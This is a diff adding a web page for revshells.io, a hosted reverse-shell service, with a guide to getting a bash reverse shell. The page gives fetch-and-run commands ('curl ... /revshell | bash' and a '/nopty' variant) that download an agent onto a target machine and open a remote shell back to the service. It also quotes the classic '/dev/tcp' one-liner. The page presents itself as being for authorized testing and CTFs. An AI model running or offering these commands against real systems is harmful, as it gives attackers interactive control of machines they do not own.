@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bash reverse shell callbacks | revshells.io</title>
+<meta name="description" content="Use revshells.io for bash reverse shell callbacks: create a session, run curl -fsSL https://revshells.io/SESSION/revshell | bash, and attach from the browser or rsctl.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://revshells.io/articles/bash-reverse-shell">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="revshells.io">
+<meta property="og:title" content="Bash reverse shell callbacks | revshells.io">
+<meta property="og:description" content="Use revshells.io for bash reverse shell callbacks: create a session, run curl -fsSL https://revshells.io/SESSION/revshell | bash, and attach from the browser or rsctl.">
+<meta property="og:url" content="https://revshells.io/articles/bash-reverse-shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bash reverse shell callbacks | revshells.io">
+<meta name="twitter:description" content="Catch bash reverse shell callbacks on revshells.io with curl bootstrap and browser or CLI attach.">
+<!-- __ANALYTICS_LOCAL__ -->
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="stylesheet" href="/static/common.css">
+</head>
+<body>
+<header class="topbar">
+  <a href="/" class="brand">
+    <div class="brand-logo">rsd</div>
+    <div class="brand-text">
+      <span class="brand-name">revshells.io</span>
+      <span class="brand-version" id="rsd-version">v0.0.0</span>
+    </div>
+  </a>
+  <div class="topbar-actions">
+    <a href="/articles" class="btn">Guides</a>
+    <a href="/" class="btn btn-primary">Create session</a>
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+  </div>
+</header>
+
+<main class="article-main">
+  <h1>Bash reverse shell with revshells.io</h1>
+  <p class="article-lead">Instead of crafting <code>bash -i >& /dev/tcp/...</code> one-liners and standing up your own listener, revshells.io gives you a stable HTTPS callback URL per session. The target runs a short bootstrap script; you attach from the browser or CLI.</p>
+
+  <h2>1. Create a session</h2>
+  <p>Open <a href="/">revshells.io</a> and click <strong>+ New session</strong>. You get a unique session ID (UUID) and callback URLs scoped to that session.</p>
+
+  <h2>2. Run the bash bootstrap on the target</h2>
+  <p>On a Linux/macOS target with <code>curl</code> or <code>wget</code>, run (replace <code>SESSION-ID</code> with yours):</p>
+  <pre>curl -fsSL https://revshells.io/SESSION-ID/revshell | bash</pre>
+  <p>This downloads the <code>rs-agent</code> binary for the target platform and connects back over WebSocket with a full PTY shell when a TTY is available.</p>
+
+  <h2>3. No TTY / restricted shells</h2>
+  <p>If the target has no PTY (common in web shells or cron jobs), use command mode:</p>
+  <pre>curl -fsSL https://revshells.io/SESSION-ID/nopty | bash</pre>
+  <p>Output is line-based over HTTP long-poll instead of an interactive terminal.</p>
+
+  <h2>4. Attach as operator</h2>
+  <ul>
+    <li><strong>Browser:</strong> open your session page on revshells.io — the terminal connects automatically.</li>
+    <li><strong>CLI:</strong> mint a workspace token from the hub, then <code>rsctl attach SESSION-ID</code>.</li>
+  </ul>
+
+  <nav class="article-nav">
+    <a class="btn" href="/articles/php-reverse-shell">PHP guide →</a>
+    <a class="btn" href="/articles">All guides</a>
+  </nav>
+
+  <p class="article-disclaimer">For authorized security testing, CTFs, and lab environments only.</p>
+</main>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script>rsdInitTopbar();</script>
+</body>
+</html>
